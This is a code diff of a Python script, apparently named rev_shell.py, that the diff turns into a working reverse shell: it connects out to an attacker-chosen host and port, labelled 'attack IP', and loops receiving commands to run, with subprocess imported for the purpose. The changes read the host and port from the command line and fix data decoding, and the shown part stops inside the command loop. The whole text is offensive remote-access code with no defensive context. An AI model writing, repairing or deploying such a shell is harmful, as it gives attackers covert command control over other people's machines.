@@ -1,16 +1,21 @@
-import socketserver
+import socket
 import subprocess
 import os
+import sys
 
-HOST = ""  # attack IP
-PORT = 3764  # attack property
+if (len(sys.argv) != 3):
+    print("Incorrect format. Please run 'python rev_shell.py <HOST> <PORT>'")
+    quit()
+
+HOST = sys.argv[1]  # attack IP
+PORT = int(sys.argv[2])  # attack property
 
 connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 connection_socket.connect((HOST, PORT))
 
 while True:
-    cmd = connection_socket.recv(1024)
+    cmd = connection_socket.recv(1024).decode()
 
     if (cmd == "quit"):
         break
